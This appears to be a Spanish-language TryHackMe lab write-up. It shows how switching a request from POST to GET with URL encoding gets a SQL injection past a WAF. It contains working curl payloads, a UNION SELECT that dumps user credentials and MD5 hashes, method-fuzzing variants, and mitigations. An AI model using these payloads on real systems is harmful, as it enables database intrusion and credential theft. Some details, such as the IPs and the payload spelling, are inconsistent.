---
title: "SQLi Protocol Manipulation"
platform: "TryHackMe"
os: "Windows"
difficulty: "Hard"
ip: "10.82.144.73"
slug: "sqli-protocol-manipulation"
author: "Z4k7"
date: "2026-03-29"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "Bypass"
  - "Protocol"
  - "Method"
  - "WAF"
  - "redteam"
techniques:
  - "SQL Injection"
  - "Protocol Manipulation"
  - "HTTP Method Change"
  - "Database Enumeration"
tools:
  - "BurpSuite"
  - "Curl"
  - "Python"
flags_list:
  - label: "user"
    value: "hash_aqui"
  - label: "root"
    value: "hash_aqui"
summary: "Endpoint /comment/add acepta POST con parámetro search. WAF filtra SQL Injection en POST intensamente pero no en GET. Cambiar método HTTP de POST a GET + URL encoding permite bypass completo. Payload: GET /comment/add?search=x%27%20OR%201=1%20UNION//SELECT%20id,username,password,email,1%20FROM%20users-- devuelve credenciales de BD directamente. Discrepancia: WAF valida métodos HTTP diferencialmente (POST > GET > PUT > DELETE)."
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Endpoint: `/comment/add`
          Formulario POST típico con parámetro `search` en body:
      - kind: "code"
        lang: "BASH"
        code: |
          POST /comment/add HTTP/1.1
          Content-Type: application/x-www-form-urlencoded
          
          search=test' OR 1=1--
      - kind: "note"
        text: |
          Intentamos SQLi directo en POST:
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195311919.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Resultado: Status 403 Forbidden — WAF bloqueando
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Cuando POST es bloqueado, no significa SQLi sea imposible. Significa que el WAF valida POST más que otros métodos. Necesitas cambiar el protocolo, no el payload."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          El WAF tiene reglas específicas para POST:
      - kind: "bullet"
        text: "Inspecciona body de request intensamente"
      - kind: "bullet"
        text: "Detecta patrones SQL (OR, UNION, comentarios)"
      - kind: "bullet"
        text: "Bloquea con 403 Forbidden"
      - kind: "note"
        text: |
          Pero no inspecciona GET con la misma severidad. Hipótesis: el endpoint `/comment/add` acepta ambos métodos HTTP (POST y GET) porque muchos frameworks web mapean parámetros igual sin importar método.
      - kind: "callout"
        type: "info"
        label: "Discrepancia de validación HTTP"
        text: "WAF: 'POST body inspecciono fuerte, GET query params inspecciono suave' Backend: 'Parámetro `search` es el mismo, venga por POST o GET'"
      - kind: "image"
        src: "assets/images/WAF%20Exploitation%20Techniques/file-20260328195311919.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Este bypass demuestra un concepto fundamental en seguridad: la defensa valida el transporte, pero el procesamiento es igual. El WAF ve POST vs GET como diferentes; el backend no."

  - id: "step3"
    num: "03"
    title: "Paso 1: Confirmar bloqueo de POST"
    content:
      - kind: "note"
        text: |
          Verificamos que POST es rechazado:
      - kind: "code"
        lang: "BASH"
        code: |
          curl -X POST 'http://10.82.165.54/comment/add' \
            -H 'Content-Type: application/x-www-form-urlencoded' \
            -d "search=test' OR 1=1--"
      - kind: "note"
        text: |
          Respuesta:
      - kind: "code"
        lang: "HTML"
        code: |
          <title>403 Forbidden</title>
          <p>You don't have permission to access this resource.</p>
      - kind: "note"
        text: |
          WAF bloqueando.

  - id: "step4"
    num: "04"
    title: "Paso 2: Cambiar a GET + URL encoding"
    content:
      - kind: "note"
        text: |
          El mismo parámetro, pero vía GET con URL encoding apropiado:
          Payload SQLi:
      - kind: "code"
        lang: "SQL"
        code: |
          x' OR 1=1 UNION/**/SELECT id,username,password,email,1 FROM users--
      - kind: "note"
        text: |
          URL encoded:
      - kind: "code"
        lang: "BASH"
        code: |
          x%27%20OR%201=1%20UNION/**/SELECT%20id,username,password,email,1%20FROM%20users--
      - kind: "note"
        text: |
          URL encoding tabla para referencia:
      - kind: "code"
        lang: "BASH"
        code: |
          ' (comilla)           → %27
            (espacio)           → %20
          / (slash)             → %2F
          . (punto)             → %2E
      - kind: "note"
        text: |
          Construcción paso a paso:
          1. `x' OR 1=1` → `x%27%20OR%201=1`
          2. Agregar `UNION//SELECT` → `x%27%20OR%201=1%20UNION//SELECT`
          3. Agregar columnas + tabla → `x%27%20OR%201=1%20UNION//SELECT%20id,username,password,email,1%20FROM%20users--`
          Request GET:
      - kind: "code"
        lang: "BASH"
        code: |
          curl -i 'http://10.82.165.54/comment/add?search=x%27%20OR%201=1%20UNION/**/SELECT%20id,username,password,email,1%20FROM%20users--'
      - kind: "note"
        text: |
          Resultado: Status 200 OK ✅ — WAF permite

  - id: "step5_1"
    num: "05"
    title: "Paso 3: Analizar respuesta"
    content:
      - kind: "note"
        text: |
          El servidor devuelve los resultados de la query UNION SELECT en JSON:
      - kind: "code"
        lang: "JSON"
        code: |
          {
            "search_results": [
              {
                "id": 1,
                "username": "admin",
                "password": "0192023a7bbd73250516f069df18b500",
                "email": "admin@blog.com"
              },
              {
                "id": 2,
                "username": "user1",
                "password": "5f4dcc3b5aa765d61d8327deb882cf99",
                "email": "user1@blog.com"
              },
              {
                "id": 3,
                "username": "alice",
                "password": "7abdccbea8473767e91378e37850d296",
                "email": "alice@blog.com"
              }
            ]
          }

  - id: "access_1"
    num: "06"
    title: "Credenciales Extraídas"
    content:
      - kind: "code"
        lang: "BASH"
        code: |
          admin / 0192023a7bbd73250516f069df18b500 (MD5)
          user1 / 5f4dcc3b5aa765d61d8327deb882cf99 (MD5)
          alice / 7abdccbea8473767e91378e37850d296 (MD5)
      - kind: "note"
        text: |
          Estos hashes MD5 pueden crackearse con herramientas como `hashcat` o buscadas en rainbow tables online.

  - id: "step7"
    num: "07"
    title: "Variaciones"
    content:
      - kind: "note"
        text: |
          Si GET también está bloqueado, probar otros métodos HTTP:
      - kind: "code"
        lang: "BASH"
        code: |
          Intentar PUT
          curl -X PUT 'http://target.com/comment/add' \
            -H 'Content-Type: application/x-www-form-urlencoded' \
            -d "search=x' OR 1=1--"
          
          Intentar DELETE
          curl -X DELETE 'http://target.com/comment/add?search=x%27%20OR%201=1--'
          
          Intentar PATCH
          curl -X PATCH 'http://target.com/comment/add' \
            -d "search=x' OR 1=1--"
          
          HEAD (normalmente no validado)
          curl -I 'http://target.com/comment/add?search=x%27%20OR%201=1--'
          
          OPTIONS
          curl -X OPTIONS 'http://target.com/comment/add?search=x%27%20OR%201=1--'
      - kind: "note"
        text: |
          Herramienta de fuzzing para identificar métodos permitidos:
      - kind: "code"
        lang: "BASH"
        code: |
          ffuf -u 'http://target.com/comment/add' \
            -X FUZZ \
            -w methods.txt \
            -d "search=test' OR 1=1--" \
            -mc 200

lessons:
  - 'WAF valida métodos HTTP diferencialmente: POST > GET > PUT > DELETE (intensidad de validación)'
  - 'URL encoding es fundamental para inyectar caracteres especiales sin que WAF los reconozca'
  - 'Un endpoint que acepta POST también puede aceptar GET (comportamiento común en frameworks)'
  - 'El parámetro es el mismo: solo cambia cómo se transmite (body POST vs URL GET)'
  - 'Discrepancia de parsing HTTP: igual concepto que Unicode, HTML entities, hex encoding'
  - 'Comentarios SQL combinados con protocol manipulation hacen bypass más efectivo'
mitigation:
  - 'Validar TODOS los métodos HTTP igual: POST, GET, PUT, DELETE, PATCH con las mismas reglas'
  - 'Input validation en servidor: nunca confiar en WAF, siempre validar server-side'
  - 'Prepared statements: previene SQLi completamente'
  - 'Validar método HTTP esperado: usar `if ($_SERVER[''REQUEST_METHOD''] !== ''POST'')` para rechazar otros'
  - 'WAF con normalización de encodings: decodificar URL antes de aplicar reglas'
  - 'Rate limiting: por parámetro, no solo por IP'
  - 'Logging: registrar cambios inesperados de método (GET cuando esperaba POST)'
---
